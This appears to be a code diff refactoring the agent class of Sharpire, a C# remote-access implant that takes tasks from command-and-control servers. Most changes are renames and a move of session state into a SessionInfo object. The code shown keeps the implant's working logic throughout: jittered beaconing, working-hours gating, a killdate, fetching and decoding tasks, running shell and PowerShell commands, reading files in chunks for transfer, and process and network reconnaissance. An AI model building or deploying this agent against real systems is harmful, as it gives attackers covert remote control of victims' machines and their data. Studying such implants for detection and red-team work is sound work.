@@ -10,7 +10,6 @@ using System.Net;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Text;
-using System.Text.RegularExpressions;
 using System.Threading;
 
 namespace Sharpire
@@ -18,32 +17,23 @@ namespace Sharpire
     class Agent
     {
         [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern Boolean IsWow64Process([In] IntPtr process, [Out] out bool wow64Process);
+        private static extern bool IsWow64Process([In] IntPtr process, [Out] out bool wow64Process);
 
-        private String sessionId;
-        private String[] controlServers;
         private DateTime killDate;
-        private Byte[] packets;
-        private String[] workingHours = new String[2];
-        //private String profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
+        private byte[] packets;
         
-        private  String defaultResponse { get; set; }
-
+        private SessionInfo sessionInfo;
         private Coms coms;
         private JobTracking jobTracking;
 
         ////////////////////////////////////////////////////////////////////////////////
-        public Agent(String stagingKey, String sessionKey, String sessionId, String servers)
+        //
+        ////////////////////////////////////////////////////////////////////////////////
+        public Agent(SessionInfo sessionInfo)
         {
-            this.sessionId = sessionId;
-            defaultResponse = "";
 
-            killDate = DateTime.Now;
-            killDate.AddYears(1);
-
-            controlServers = servers.Split(',');
-
-            coms = new Coms(sessionId, stagingKey, sessionKey, controlServers);
+            this.sessionInfo = sessionInfo;
+            coms = new Coms(sessionInfo);
             jobTracking = new JobTracking();
         }
 
@@ -69,92 +59,104 @@ namespace Sharpire
         private void Run()
         {
             ////////////////////////////////////////////////////////////////////////////////
-            if (killDate.CompareTo(DateTime.Now) > 0 || coms.missedCheckins > coms.lostLimit)
+            if (killDate.CompareTo(DateTime.Now) > 0 || coms.MissedCheckins > sessionInfo.GetDefaultLostLimit())
             {
                 jobTracking.CheckAgentJobs(ref packets, ref coms);
 
                 if (packets.Length > 0)
                 {
-                    coms.sendMessage(packets);
+                    coms.SendMessage(packets);
                 }
 
-                String message = "";
+                string message = "";
                 if(killDate.CompareTo(DateTime.Now) > 0)
                 {
-                    message = "[!] Agent " + sessionId + " exiting: past killdate";
+                    message = "[!] Agent " + sessionInfo.GetAgentID() + " exiting: past killdate";
                 }
                 else
                 {
-                    message = "[!] Agent " + sessionId + " exiting: Lost limit reached";
+                    message = "[!] Agent " + sessionInfo.GetAgentID() + " exiting: Lost limit reached";
                 }
 
-                UInt16 result = 0;
-                coms.sendMessage(coms.encodePacket(2, message, result));
+                ushort result = 0;
+                coms.SendMessage(coms.EncodePacket(2, message, result));
                 Environment.Exit(1);
             }
 
             ////////////////////////////////////////////////////////////////////////////////
-            Regex regex = new Regex("^[0-9]{1,2}:[0-5][0-9]$");
-            if (workingHours != null && workingHours[0] != null && workingHours[1] != null)
+            
+            if (null != sessionInfo.GetWorkingHoursStart() && null != sessionInfo.GetWorkingHoursEnd())
             {
-                if (regex.Match(workingHours[0]).Success && regex.Match(workingHours[1]).Success)
-                {
-                    DateTime now = DateTime.Now;
-                    DateTime start = DateTime.Parse(workingHours[0]);
-                    DateTime end = DateTime.Parse(workingHours[1]);
-                    if ((end.Hour - start.Hour) < 0)
-                    {
-                        start = start.AddDays(-1);
-                    }
-                    if (now.CompareTo(start) > 0 && now.CompareTo(end) < 0)
-                    {
-                        TimeSpan sleep = start.Subtract(now);
-                        if (sleep.CompareTo(0) < 0)
-                        {
-                            sleep = (start.AddDays(1) - now);
-                        }
-                        Thread.Sleep((Int32)sleep.TotalMilliseconds);
-                    }
+                DateTime now = DateTime.Now;
 
+                if ((sessionInfo.GetWorkingHoursEnd() - sessionInfo.GetWorkingHoursStart()).Hours < 0)
+                {
+                    sessionInfo.SetWorkingHoursStart(sessionInfo.GetWorkingHoursStart().AddDays(-1));
+                }
+
+                if (now.CompareTo(sessionInfo.GetWorkingHoursStart()) > 0 
+                    && now.CompareTo(sessionInfo.GetWorkingHoursEnd()) < 0)
+                {
+                    TimeSpan sleep = sessionInfo.GetWorkingHoursStart().Subtract(now);
+                    if (sleep.CompareTo(0) < 0)
+                    {
+                        sleep = (sessionInfo.GetWorkingHoursStart().AddDays(1) - now);
+                    }
+                    Thread.Sleep((int)sleep.TotalMilliseconds);
                 }
             }
 
             ////////////////////////////////////////////////////////////////////////////////
-            if (coms.agentDelay != 0)
+            if (0 != sessionInfo.GetDefaultDelay())
             {
-                Int32 sleepMin = (coms.agentJitter - 1) * coms.agentDelay;
-                Int32 sleepMax = (coms.agentJitter + 1) * coms.agentDelay;
+                int max = (int)((sessionInfo.GetDefaultJitter() + 1) * sessionInfo.GetDefaultDelay());
+                if (max > int.MaxValue)
+                {
+                    max = int.MaxValue - 1;
+                }
 
-                if (sleepMin == sleepMax)
-                    coms.sleepTime = sleepMin;
+                int min = (int)((sessionInfo.GetDefaultJitter() - 1) * sessionInfo.GetDefaultDelay());
+                if (min < 0)
+                {
+                    min = 0;
+                }
+
+                int sleepTime;
+                if (min == max)
+                {
+                    sleepTime = min;
+                }
                 else
-                    coms.sleepTime = new Random().Next(sleepMin, sleepMax);
+                {
+                    Random random = new Random();
+                    sleepTime = random.Next(min, max);
+                }
 
-                Thread.Sleep(coms.sleepTime * 1000);
+                Thread.Sleep(sleepTime * 1000);
             }
 
             ////////////////////////////////////////////////////////////////////////////////
-            Byte[] jobResults = jobTracking.GetAgentJobsOutput(ref coms);
+            byte[] jobResults = jobTracking.GetAgentJobsOutput(ref coms);
             if (0 < jobResults.Length)
             {
-                coms.sendMessage(jobResults);
+                coms.SendMessage(jobResults);
             }
 
             ////////////////////////////////////////////////////////////////////////////////
-            Byte[] taskData = coms.getTask();
+            byte[] taskData = coms.GetTask();
             if (taskData.Length > 0)
             {
-                coms.missedCheckins = 0;
-                if (Encoding.UTF8.GetString(taskData) != defaultResponse)
+                coms.MissedCheckins = 0;
+                if (String.Empty != Encoding.UTF8.GetString(taskData))
                 {
-                    coms.decodeRoutingPacket(taskData, ref jobTracking);
+                    coms.DecodeRoutingPacket(taskData, ref jobTracking);
                 }
             }
             GC.Collect();
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        internal static byte[] getFilePart(String file, Int32 index, Int32 chunkSize)
+        internal static byte[] getFilePart(string file, int index, int chunkSize)
         {
             byte[] output = new byte[0];
             try
@@ -179,9 +181,9 @@ namespace Sharpire
                     else
                     {
                         output = new byte[chunkSize];
-                        Int32 start = index * chunkSize;
+                        int start = index * chunkSize;
                         fileStream.Seek(start, 0);
-                        Int32 count = fileStream.Read(output, 0, output.Length);
+                        int count = fileStream.Read(output, 0, output.Length);
                         if (count > 0)
                         {
                             if (count != chunkSize)
@@ -211,7 +213,7 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         // Almost Done - Finish move copy delete
         ////////////////////////////////////////////////////////////////////////////////
-        internal static String InvokeShellCommand(String command, String arguments)
+        internal static string InvokeShellCommand(string command, string arguments)
         {
             if (arguments.Contains("*\"\\\\*")) 
             {
@@ -221,7 +223,7 @@ namespace Sharpire
             {
                 arguments = arguments.Replace("\\\\", "FileSystem::\\");
             }
-            String output = "";
+            string output = "";
             if (command.ToLower() == "shell")
             {
                 if (command.Length > 0)
@@ -243,7 +245,7 @@ namespace Sharpire
                 else if (command == "mv" || command == "move")
                 {
                     Console.WriteLine(arguments);
-                    String[] parts = arguments.Split(' ');
+                    string[] parts = arguments.Split(' ');
                     if (2 != parts.Length)
                         return "Invalid mv|move command";
                     MoveFile(parts.FirstOrDefault(), parts.LastOrDefault());
@@ -251,7 +253,7 @@ namespace Sharpire
                 }
                 else if (command == "cp" || command == "copy")
                 {
-                    String[] parts = arguments.Split(' ');
+                    string[] parts = arguments.Split(' ');
                     if (2 != parts.Length)
                         return "Invalid cp|copy command";
                     CopyFile(parts.FirstOrDefault(), parts.LastOrDefault());
@@ -306,7 +308,7 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         // Working
         ////////////////////////////////////////////////////////////////////////////////
-        private static void shutdown(String flags)
+        private static void shutdown(string flags)
         {
             ManagementClass managementClass = new ManagementClass("Win32_OperatingSystem");
             managementClass.Get();
@@ -326,9 +328,9 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         // Working
         ////////////////////////////////////////////////////////////////////////////////
-        private static String route(String arguments)
+        private static string route(string arguments)
         {
-            Dictionary<UInt32, String> adapters = new Dictionary<UInt32, String>();
+            Dictionary<uint, string> adapters = new Dictionary<uint, string>();
             ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
             scope.Connect();
             ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_NetworkAdapterConfiguration");
@@ -336,61 +338,61 @@ namespace Sharpire
             ManagementObjectCollection objectCollection = objectSearcher.Get();
             foreach (ManagementObject managementObject in objectCollection)
             {
-                adapters[(UInt32)managementObject["InterfaceIndex"]] = managementObjectToString((String[])managementObject["IPAddress"]);
+                adapters[(uint)managementObject["InterfaceIndex"]] = managementObjectToString((string[])managementObject["IPAddress"]);
             }
 
-            List<String> lines = new List<String>();
+            List<string> lines = new List<string>();
             ObjectQuery query2 = new ObjectQuery("SELECT * FROM Win32_IP4RouteTable ");
             ManagementObjectSearcher objectSearcher2 = new ManagementObjectSearcher(scope, query2);
             ManagementObjectCollection objectCollection2 = objectSearcher2.Get();
             foreach (ManagementObject managementObject in objectCollection2)
             {
-                String destination = "";
+                string destination = "";
                 if (managementObject["Destination"] != null)
                 {
-                    destination = (String)managementObject["Destination"];
+                    destination = (string)managementObject["Destination"];
                 }
 
-                String netmask = "";
+                string netmask = "";
                 if (managementObject["Mask"] != null)
                 {
-                    netmask = (String)managementObject["Mask"];
+                    netmask = (string)managementObject["Mask"];
                 }
 
-                String nextHop = "0.0.0.0";
-                if ((String)managementObject["NextHop"] != "0.0.0.0")
+                string nextHop = "0.0.0.0";
+                if ((string)managementObject["NextHop"] != "0.0.0.0")
                 {
-                    nextHop = (String)managementObject["NextHop"];
+                    nextHop = (string)managementObject["NextHop"];
                 }
 
-                Int32 index = (Int32)managementObject["InterfaceIndex"];
-                
-                String adapter = "";
-                if (!adapters.TryGetValue((UInt32)index, out adapter))
+                int index = (int)managementObject["InterfaceIndex"];
+
+                string adapter = "";
+                if (!adapters.TryGetValue((uint)index, out adapter))
                 {
                     adapter = "127.0.0.1";
                 }
 
-                String metric = Convert.ToString((Int32)managementObject["Metric1"]);
+                string metric = Convert.ToString((int)managementObject["Metric1"]);
 
                 lines.Add(
-                    String.Format("{0,-17} : {1,-50}\n", "Destination", destination) +
-                    String.Format("{0,-17} : {1,-50}\n", "Netmask", netmask) +
-                    String.Format("{0,-17} : {1,-50}\n", "NextHop", nextHop) +
-                    String.Format("{0,-17} : {1,-50}\n", "Interface", adapter) +
-                    String.Format("{0,-17} : {1,-50}\n", "Metric", metric)    
+                    string.Format("{0,-17} : {1,-50}\n", "Destination", destination) +
+                    string.Format("{0,-17} : {1,-50}\n", "Netmask", netmask) +
+                    string.Format("{0,-17} : {1,-50}\n", "NextHop", nextHop) +
+                    string.Format("{0,-17} : {1,-50}\n", "Interface", adapter) +
+                    string.Format("{0,-17} : {1,-50}\n", "Metric", metric)    
                 );
 
             }
-            return String.Join("\n", lines.ToArray());
+            return string.Join("\n", lines.ToArray());
         }
 
         ////////////////////////////////////////////////////////////////////////////////
         // Working
         ////////////////////////////////////////////////////////////////////////////////
-        private static String tasklist(String arguments)
+        private static string tasklist(string arguments)
         {
-            Dictionary<Int32, String> owners = new Dictionary<Int32, String>();
+            Dictionary<int, string> owners = new Dictionary<int, string>();
             ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
             scope.Connect();
             ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_Process");
@@ -398,8 +400,8 @@ namespace Sharpire
             ManagementObjectCollection objectCollection = objectSearcher.Get();
             foreach (ManagementObject managementObject in objectCollection)
             {
-                String name = "";
-                String[] owner = new String[2];
+                string name = "";
+                string[] owner = new string[2];
                 managementObject.InvokeMethod("GetOwner", (object[]) owner);
                 if (owner[0] != null)
                 {
@@ -413,13 +415,13 @@ namespace Sharpire
                 owners[Convert.ToInt32(managementObject["Handle"])] = name;
             }
 
-            List<String[]> lines = new List<String[]>();
+            List<string[]> lines = new List<string[]>();
             System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcesses();
             foreach (System.Diagnostics.Process process in processes)
             {
-                String architecture;
-                Int32 workingSet;
-                Boolean isWow64Process;
+                string architecture;
+                int workingSet;
+                bool isWow64Process;
                 try
                 {
                     IsWow64Process(process.Handle, out isWow64Process);
@@ -436,9 +438,9 @@ namespace Sharpire
                 {
                     architecture = "N/A";
                 }
-                workingSet = (Int32)(process.WorkingSet64 / 1000000);
+                workingSet = (int)(process.WorkingSet64 / 1000000);
 
-                String userName = "";
+                string userName = "";
                 try
                 {
                     if (!owners.TryGetValue(process.Id, out userName))
@@ -452,7 +454,7 @@ namespace Sharpire
                 }
 
                 lines.Add(
-                    new String[] {process.ProcessName,
+                    new string[] {process.ProcessName,
                         process.Id.ToString(),
                         architecture,
                         userName,
@@ -462,56 +464,56 @@ namespace Sharpire
 
             }
 
-            String[][] linesArray = lines.ToArray();
+            string[][] linesArray = lines.ToArray();
 
             //https://stackoverflow.com/questions/232395/how-do-i-sort-a-two-dimensional-array-in-c
-            Comparer<Int32> comparer = Comparer<Int32>.Default;
+            Comparer<int> comparer = Comparer<int>.Default;
             Array.Sort<String[]>(linesArray, (x, y) => comparer.Compare(Convert.ToInt32(x[1]), Convert.ToInt32(y[1])));
             
-            List<String> sortedLines = new List<String>();
-            String[] headerArray = {"ProcessName", "PID", "Arch", "UserName", "MemUsage"};
-            sortedLines.Add(String.Format("{0,-30} {1,-8} {2,-6} {3,-28} {4,8}", headerArray));
-            foreach (String[] line in linesArray)
+            List<string> sortedLines = new List<string>();
+            string[] headerArray = {"ProcessName", "PID", "Arch", "UserName", "MemUsage"};
+            sortedLines.Add(string.Format("{0,-30} {1,-8} {2,-6} {3,-28} {4,8}", headerArray));
+            foreach (string[] line in linesArray)
             {
-                sortedLines.Add(String.Format("{0,-30} {1,-8} {2,-6} {3,-28} {4,8} M", line));
+                sortedLines.Add(string.Format("{0,-30} {1,-8} {2,-6} {3,-28} {4,8} M", line));
             }
-            return String.Join("\n", sortedLines.ToArray());
+            return string.Join("\n", sortedLines.ToArray());
         } 
 
         ////////////////////////////////////////////////////////////////////////////////
         // Working
         ////////////////////////////////////////////////////////////////////////////////
-        private static String ifconfig()
+        private static string ifconfig()
         {
             ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
             scope.Connect();
             ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_NetworkAdapterConfiguration");
             ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
             ManagementObjectCollection objectCollection = objectSearcher.Get();
-            List<String> lines = new List<String>();
+            List<string> lines = new List<string>();
             foreach (ManagementObject managementObject in objectCollection)
             {
-                if ((Boolean)managementObject["IPEnabled"] == true)
+                if ((bool)managementObject["IPEnabled"] == true)
                 {
                     lines.Add(
-                        String.Format("{0,-17} : {1,-50}\n", "Description", managementObject["Description"]) +
-                        String.Format("{0,-17} : {1,-50}\n", "MACAddress", managementObject["MACAddress"]) +
-                        String.Format("{0,-17} : {1,-50}\n", "DHCPEnabled", managementObject["DHCPEnabled"]) +
-                        String.Format("{0,-17} : {1,-50}\n", "IPAddress", managementObjectToString((String[])managementObject["IPAddress"])) +
-                        String.Format("{0,-17} : {1,-50}\n", "IPSubnet", managementObjectToString((String[])managementObject["IPSubnet"])) +
-                        String.Format("{0,-17} : {1,-50}\n", "DefaultIPGateway", managementObjectToString((String[])managementObject["DefaultIPGateway"])) +
-                        String.Format("{0,-17} : {1,-50}\n", "DNSServer", managementObjectToString((String[])managementObject["DNSServerSearchOrder"])) +
-                        String.Format("{0,-17} : {1,-50}\n", "DNSHostName", managementObject["DNSHostName"]) +
-                        String.Format("{0,-17} : {1,-50}\n", "DNSSuffix", managementObjectToString((String[])managementObject["DNSDomainSuffixSearchOrder"]))
+                        string.Format("{0,-17} : {1,-50}\n", "Description", managementObject["Description"]) +
+                        string.Format("{0,-17} : {1,-50}\n", "MACAddress", managementObject["MACAddress"]) +
+                        string.Format("{0,-17} : {1,-50}\n", "DHCPEnabled", managementObject["DHCPEnabled"]) +
+                        string.Format("{0,-17} : {1,-50}\n", "IPAddress", managementObjectToString((string[])managementObject["IPAddress"])) +
+                        string.Format("{0,-17} : {1,-50}\n", "IPSubnet", managementObjectToString((string[])managementObject["IPSubnet"])) +
+                        string.Format("{0,-17} : {1,-50}\n", "DefaultIPGateway", managementObjectToString((string[])managementObject["DefaultIPGateway"])) +
+                        string.Format("{0,-17} : {1,-50}\n", "DNSServer", managementObjectToString((string[])managementObject["DNSServerSearchOrder"])) +
+                        string.Format("{0,-17} : {1,-50}\n", "DNSHostName", managementObject["DNSHostName"]) +
+                        string.Format("{0,-17} : {1,-50}\n", "DNSSuffix", managementObjectToString((string[])managementObject["DNSDomainSuffixSearchOrder"]))
                     );
                 }
             }
-            return String.Join("\n", lines.ToArray());
+            return string.Join("\n", lines.ToArray());
         }
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        private static void DeleteFile(String sourceFile)
+        private static void DeleteFile(string sourceFile)
         {
             if (IsFile(sourceFile))
                 File.Delete(sourceFile);
@@ -521,7 +523,7 @@ namespace Sharpire
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        private static void CopyFile(String sourceFile, String destinationFile)
+        private static void CopyFile(string sourceFile, string destinationFile)
         {
             if (IsFile(sourceFile))
             {
@@ -544,7 +546,7 @@ namespace Sharpire
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        private static void MoveFile(String sourceFile, String destinationFile)
+        private static void MoveFile(string sourceFile, string destinationFile)
         {
             if (IsFile(sourceFile))
                 File.Move(sourceFile, destinationFile);
@@ -554,7 +556,7 @@ namespace Sharpire
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        private static Boolean IsFile(String filePath)
+        private static bool IsFile(string filePath)
         {
             FileAttributes fileAttributes = File.GetAttributes(filePath);
             return (fileAttributes & FileAttributes.Directory) == FileAttributes.Directory ? false : true;
@@ -563,12 +565,12 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         // Working
         ////////////////////////////////////////////////////////////////////////////////
-        private static String managementObjectToString(String[] managementObject)
+        private static string managementObjectToString(string[] managementObject)
         {
-            String output;
+            string output;
             if (managementObject != null && managementObject.Length > 0)
             {
-                output = String.Join(", ", managementObject);
+                output = string.Join(", ", managementObject);
             }
             else
             {
@@ -580,7 +582,7 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         // Working
         ////////////////////////////////////////////////////////////////////////////////
-        private static String getChildItem(String folder)
+        private static string getChildItem(string folder)
         {
             if (folder == "")
             {
@@ -589,7 +591,7 @@ namespace Sharpire
 
             try
             {
-                List<String> lines = new List<String>();
+                List<string> lines = new List<string>();
                 DirectoryInfo directoryInfo = new DirectoryInfo(folder);
                 FileInfo[] files = directoryInfo.GetFiles();
                 foreach (FileInfo file in files)
@@ -599,7 +601,7 @@ namespace Sharpire
                     //output += file.Length + "\t";
                     //output += file.Name + "\n\r";
                 }
-                return String.Join("\n", lines.ToArray());
+                return string.Join("\n", lines.ToArray());
             }
             catch (Exception error)
             {
@@ -610,7 +612,7 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         // Working
         ////////////////////////////////////////////////////////////////////////////////
-        internal static String RunPowerShell(String command)
+        internal static string RunPowerShell(string command)
         {
             using (Runspace runspace = RunspaceFactory.CreateRunspace())
             {
